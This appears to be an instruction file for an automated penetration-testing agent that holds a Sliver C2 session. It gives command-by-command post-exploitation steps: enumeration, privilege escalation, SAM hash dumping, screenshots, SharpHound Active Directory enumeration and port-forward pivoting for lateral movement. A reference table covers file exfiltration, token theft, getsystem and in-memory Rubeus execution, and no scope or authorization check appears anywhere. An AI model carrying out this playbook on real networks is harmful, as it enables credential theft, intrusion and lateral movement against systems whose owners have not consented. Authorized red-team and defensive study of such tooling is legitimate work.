## C2 Post-Exploitation Instructions

You have an established Sliver C2 session. Use it to perform post-exploitation.

### Step 1: Load Session Info

Read c2_session.json to get the session ID:
```bash
cat /pentest/output/$JOB_ID/c2_session.json | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['sessions'][0]['session_id'])"
```

### Step 2: Situational Awareness (ALWAYS DO FIRST)

```bash
python3 /opt/tazosploit/scripts/c2_post_exploit.py \
  --session-id <SESSION_ID> --action enum \
  --output-dir /pentest/output/$JOB_ID --json
```

This runs: whoami, process list, network interfaces, netstat, environment.

### Step 3: Decision Tree (Based on Enum Results)

**If unprivileged (not SYSTEM/root):**
1. Check for privesc paths:
   ```bash
   python3 /opt/tazosploit/scripts/c2_post_exploit.py \
     --session-id <SESSION_ID> --action privesc --json
   ```
2. If privesc found, escalate first, then continue

**If privileged (SYSTEM/root):**
1. Dump credentials:
   ```bash
   python3 /opt/tazosploit/scripts/c2_post_exploit.py \
     --session-id <SESSION_ID> --action hashdump \
     --output-dir /pentest/output/$JOB_ID --json
   ```
2. Take screenshot:
   ```bash
   python3 /opt/tazosploit/scripts/c2_post_exploit.py \
     --session-id <SESSION_ID> --action screenshot \
     --output-dir /pentest/output/$JOB_ID --json
   ```

**If domain-joined:**
1. Enumerate AD (via execute-assembly with SharpHound)
2. Identify high-value targets (DCs, file servers)
3. Plan lateral movement

### Step 4: Lateral Movement (when credentials available)

Set up port forwarding for pivoting:
```bash
python3 /opt/tazosploit/scripts/c2_post_exploit.py \
  --session-id <SESSION_ID> --action portfwd \
  --remote-host 10.0.0.5 --remote-port 445 --local-port 8445 --json
```

### Step 5: Run Full Suite (automated)

```bash
python3 /opt/tazosploit/scripts/c2_post_exploit.py \
  --session-id <SESSION_ID> --action all \
  --output-dir /pentest/output/$JOB_ID --json
```

### Evidence Artifacts Created:
- `enum_results.json` — Full enumeration data
- `creds_hashdump.json` — Extracted credentials
- `hashdump_evidence.json` — Redacted evidence for report
- `screenshot.png` — Target screenshot
- `processes.json` — Process list with security software detection
- `privesc_results.json` — Privilege escalation assessment
- `post_exploit_summary.json` — Summary of all actions

### Post-Exploitation Command Reference (Sliver):

| Action | Sliver Command | Purpose |
|--------|---------------|---------|
| System info | `info` | OS, arch, hostname, user |
| Process list | `ps` | Find targets for injection, detect AV |
| Hash dump | `hashdump` | Extract SAM hashes (SYSTEM required) |
| Screenshot | `screenshot` | Visual proof of access |
| Port forward | `portfwd add -r host:port -b 127.0.0.1:lport` | Pivot through session |
| File download | `download /path/to/file` | Exfiltrate data |
| File upload | `upload local remote` | Deploy tools |
| Privesc | `getsystem` | Named pipe impersonation |
| Token steal | `impersonate` | Steal user tokens |
| Execute .NET | `execute-assembly /opt/tools/Rubeus.exe` | In-memory .NET execution |
